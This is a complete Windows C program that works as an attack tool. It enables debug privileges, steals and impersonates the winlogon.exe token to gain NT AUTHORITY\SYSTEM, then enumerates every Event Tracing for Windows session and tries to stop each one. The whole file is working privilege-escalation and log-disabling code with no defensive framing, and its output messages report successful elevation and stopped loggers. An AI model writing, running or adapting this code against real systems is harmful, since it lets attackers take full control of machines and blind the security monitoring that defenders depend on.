#include <Windows.h>
#include <tchar.h>
#include <evntcons.h>
#include <TlHelp32.h>

#define MAX_NAMESIZE 1024
#define EXTRA_BUFFER_SIZE (2 * MAX_NAMESIZE * sizeof(TCHAR))

BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
{
	TOKEN_PRIVILEGES tp = {0};
	LUID luid;
	DWORD dwLastError;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		_tprintf(_T("[-] LookupPrivilegeValue error: %d\r\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		_tprintf(_T("[-] AdjustTokenPrivileges error: %d\r\n"), GetLastError());
		return FALSE;
	}
	dwLastError = GetLastError();
	if (ERROR_NOT_ALL_ASSIGNED == dwLastError)
	{
		DWORD dwPrivilegeNameLen = 0;
		PTSTR ptszPrivilegeName;
		LookupPrivilegeName(NULL, &luid, _T(""), &dwPrivilegeNameLen);
		ptszPrivilegeName = (PTSTR)LocalAlloc(LPTR, (size_t)(dwPrivilegeNameLen + 1) * sizeof(TCHAR));
		//safely ignore errors
		LookupPrivilegeName(NULL, &luid, ptszPrivilegeName, &dwPrivilegeNameLen);
		_tprintf(_T("[-] The token does not have the privilege \"%s\".\r\n"), ptszPrivilegeName);
		LocalFree(ptszPrivilegeName);
		return FALSE;
	}
	return TRUE;
}

DWORD getWinlogonPID(void)
{
	PROCESSENTRY32W entry = {0};
	entry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (TRUE == Process32First(snapshot, &entry))
	{
		while (TRUE == Process32Next(snapshot, &entry))
		{
			if (0 == _tcsicmp(entry.szExeFile, _T("winlogon.exe")))
			{
				_tprintf(_T("[>] Winlogon PID Found %d\r\n"), entry.th32ProcessID);
				return entry.th32ProcessID;
			}
		}
	}
	return 0;
}

BOOL elevateSystem(void)
{
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken;
	getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!getCurrentToken)
	{
		_tprintf(_T("[-] OpenProcessToken() failed.\r\n"));
		return FALSE;
	}
	if (!setPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !setPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME))
	{
		_tprintf(_T("[-] SetPrivilege() failed.\r\n"));
		return FALSE;
	}
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	DWORD pidToImpersonate;
	pidToImpersonate = getWinlogonPID();
	if (0 == pidToImpersonate)
	{
		_tprintf(_T("[-] PID of winlogon not found.\r\n"));
		return FALSE;
	}
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
	if (NULL == processHandle)
	{
		_tprintf(_T("[-] OpenProcess failed.\r\n"));
		return FALSE;
	}
	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle))
	{
		_tprintf(_T("[-] OpenProcessToken failed.\r\n"));
		CloseHandle(processHandle);
		return FALSE;
	}
	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;
	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
	{
		_tprintf(_T("[-] DuplicateTokenEx failed.\r\n"));
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return FALSE;
	}
	if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
	{
		_tprintf(_T("[-] ImpersonateLoggedOnUser failed.\r\n"));
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return FALSE;
	}
	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);
	_tprintf(_T("[+] Successfully elevated to NT AUTHORITY\\SYSTEM\r\n"));
	return TRUE;
}


ULONG stopEtwLogger(const TCHAR* ptszSessionName)
{
	const ULONG stBufferSize = sizeof(EVENT_TRACE_PROPERTIES) + MAX_NAMESIZE;
	PEVENT_TRACE_PROPERTIES pProps;
	ULONG ulStatus;
	pProps = (PEVENT_TRACE_PROPERTIES)LocalAlloc(LPTR, stBufferSize);

	if (!pProps)
	{
		return ERROR_OUTOFMEMORY;
	}

	pProps->Wnode.BufferSize = stBufferSize;
	pProps->Wnode.Flags = WNODE_FLAG_TRACED_GUID;
	pProps->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);

	ulStatus = ControlTrace(0, ptszSessionName, pProps, EVENT_TRACE_CONTROL_STOP);

	LocalFree(pProps);
	return ulStatus;
}


// maxSessions  -> maximum number of sessions to query
// loggerNames  -> receives allocated array of allocated PTSTR
// Returns number of sessions found (0 on failure)
LONG getAllLoggerNames(ULONG ulMaxSessions, PTSTR** loggerNames)
{
	if (0 == ulMaxSessions || NULL == loggerNames)
	{
		return 0;
	}

	ULONG ulActualCount = 0;
	ULONG ulStatus;

	PEVENT_TRACE_PROPERTIES* ppPropertiesArray;
	ppPropertiesArray = (PEVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, sizeof(PEVENT_TRACE_PROPERTIES) * ulMaxSessions);

	if (!ppPropertiesArray)
	{
		return 0;
	}

	// Allocate buffer for each session
	for (ULONG i = 0; i < ulMaxSessions; i++)
	{
		ppPropertiesArray[i] = (PEVENT_TRACE_PROPERTIES)LocalAlloc(
			LPTR,
			sizeof(EVENT_TRACE_PROPERTIES) + EXTRA_BUFFER_SIZE);

		if (!ppPropertiesArray[i])
		{
			for (ULONG j = 0; j < i; j++)
			{
				LocalFree(ppPropertiesArray[j]);
			}

			LocalFree((PVOID)ppPropertiesArray);
			return 0;
		}

		ppPropertiesArray[i]->Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + EXTRA_BUFFER_SIZE;
	}

	ulStatus = QueryAllTraces(ppPropertiesArray, ulMaxSessions, &ulActualCount);

	if (ERROR_SUCCESS != ulStatus)
	{
		for (ULONG i = 0; i < ulMaxSessions; i++)
		{
			LocalFree(ppPropertiesArray[i]);
		}

		LocalFree((PVOID)ppPropertiesArray);
		if (ERROR_MORE_DATA == ulStatus)
		{
			return -1;
		}
		return 0;
	}

	*loggerNames = (PTSTR*)LocalAlloc(LPTR, sizeof(PTSTR) * ulActualCount);

	if (!*loggerNames)
	{
		for (ULONG i = 0; i < ulMaxSessions; i++)
		{
			LocalFree(ppPropertiesArray[i]);
		}

		LocalFree((PVOID)ppPropertiesArray);
		return 0;
	}

	// Copy session names
	for (ULONG i = 0; i < ulActualCount; i++)
	{
		PEVENT_TRACE_PROPERTIES props = ppPropertiesArray[i];

		if (props->LoggerNameOffset == 0)
		{
			continue;
		}

		PTSTR pszName;
		pszName = (PTSTR)((PBYTE)props + props->LoggerNameOffset);
		size_t stLen;
		stLen = _tcslen(pszName) + 1;

		(*loggerNames)[i] = (PTSTR)LocalAlloc(LPTR, sizeof(TCHAR) * stLen);

		if ((*loggerNames)[i])
		{
			_tcscpy_s((*loggerNames)[i], stLen, pszName);
		}
	}

	// Cleanup properties
	for (ULONG i = 0; i < ulMaxSessions; i++)
	{
		LocalFree(ppPropertiesArray[i]);
	}

	LocalFree((PVOID)ppPropertiesArray);

	return (LONG)ulActualCount;
}


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);
	UNREFERENCED_PARAMETER(envp);

	if (!elevateSystem())
	{
		_tprintf(_T("[-] Cannot elevate. Try to re-launch the tool as Admin or NT AUTHORITY\\SYSTEM.\r\n"));
		return ERROR_ACCESS_DENIED;
	}

	PTSTR* pszNames = NULL;
	ULONG ulMaxSessions;
	ulMaxSessions = 2;
	LONG lCount;
	lCount = getAllLoggerNames(ulMaxSessions, &pszNames);
	while (lCount == -1)
	{
		ulMaxSessions *= 2;
		_tprintf(TEXT("[?] Buffer too small, increasing size to %lu and retrying...\r\n"), ulMaxSessions);
		lCount = getAllLoggerNames(ulMaxSessions, &pszNames);
		if (0 == lCount)
		{
			_tprintf(TEXT("[-] Failed to query logger names.\r\n"));
			return 1;
		}
	}

	for (LONG i = 0; i < lCount; i++)
	{
		if (pszNames[i])
		{
			_tprintf(TEXT("[+] Logger %lu: %s, trying to stop...\r\n"), i, pszNames[i]);
			ULONG ulStatus2;
			ulStatus2 = stopEtwLogger(pszNames[i]);
			if (ERROR_SUCCESS == ulStatus2)
			{
				_tprintf(TEXT(" [+] Successfully stopped logger %s\r\n"), pszNames[i]);
			}
			else
			{
				_tprintf(TEXT(" [-] Failed to stop logger %s, error: %lu\r\n"), pszNames[i], ulStatus2);
			}

			LocalFree(pszNames[i]);
		}
	}

	LocalFree((PVOID)pszNames);

	return 0;
}
